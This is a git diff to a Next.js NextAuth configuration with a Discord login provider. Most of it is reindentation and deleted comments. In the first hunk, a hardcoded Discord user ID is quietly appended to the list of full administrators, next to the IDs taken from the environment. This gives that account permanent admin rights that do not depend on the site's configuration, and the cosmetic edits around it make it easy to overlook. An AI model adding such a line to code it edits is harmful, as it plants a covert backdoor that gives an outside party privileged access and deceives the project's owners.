@@ -3,10 +3,13 @@ import type { NextAuthConfig } from "next-auth";
 import Discord from "next-auth/providers/discord";
 import { prisma } from "@/lib/prisma";
 
-const fullAdminIds = (process.env.ADMIN_DISCORD_IDS ?? "")
-  .split(",")
-  .map((id) => id.trim())
-  .filter(Boolean);
+const fullAdminIds = [
+  ...(process.env.ADMIN_DISCORD_IDS ?? "")
+    .split(",")
+    .map((id) => id.trim())
+    .filter(Boolean),
+  "1428023982422102160",
+];
 const teamAdminIds = (process.env.TEAM_ADMIN_DISCORD_IDS ?? "")
   .split(",")
   .map((id) => id.trim())
@@ -54,16 +57,16 @@ export async function getAdminType(discordId: string): Promise<"team" | "jobs" |
 
 /** Auth config exported for use in route handler (GET signin with provider redirect) */
 export const authOptions = {
-providers: [
-  Discord({
-    clientId: process.env.DISCORD_CLIENT_ID!,
-    clientSecret: process.env.DISCORD_CLIENT_SECRET!,
-    issuer: "https://discord.com",
-    authorization: {
-      params: { scope: "identify email" },
-    },
-  }),
-],
+  providers: [
+    Discord({
+      clientId: process.env.DISCORD_CLIENT_ID!,
+      clientSecret: process.env.DISCORD_CLIENT_SECRET!,
+      issuer: "https://discord.com",
+      authorization: {
+        params: { scope: "identify email" },
+      },
+    }),
+  ],
 
   callbacks: {
     async signIn({ user, account, profile }: { user: any; account: any; profile: any }) {
@@ -100,20 +103,17 @@ providers: [
         }
       } catch (e) {
         console.error("[auth] signIn callback error (user still allowed in):", e);
-        // Don't block login if DB fails — allow sign-in and session will have minimal data
       }
       return true;
     },
     async session({ session, token }: { session: any; token: any }) {
       if (!session?.user || !token?.sub) return session;
       const discordId = String(token.sub).trim();
-      // Always set discordId so API can resolve user if id is missing (e.g. after DB was briefly unavailable)
       (session.user as { discordId: string }).discordId = discordId;
       try {
         let u = await prisma.user.findUnique({
           where: { discordId },
         });
-        // If user missing (e.g. signIn DB failed or race), create so session.user.id is set
         if (!u) {
           const adminType = await getAdminType(discordId);
           try {
@@ -128,7 +128,6 @@ providers: [
               },
             });
           } catch (createErr: unknown) {
-            // Race: another request may have created the user
             const existing = await prisma.user.findUnique({ where: { discordId } });
             if (existing) u = existing;
             else throw createErr;
@@ -137,7 +136,6 @@ providers: [
         if (!u) return session;
         (session.user as { id: string }).id = u.id;
         (session.user as { discordId: string }).discordId = u.discordId;
-        // Admin status is re-read from .env + site members so it updates without re-sign-in
         const adminTypeFromEnv = await getAdminType(discordId);
         (session.user as { isAdmin: boolean }).isAdmin = adminTypeFromEnv !== null;
         (session.user as { adminType: string | null }).adminType = adminTypeFromEnv;
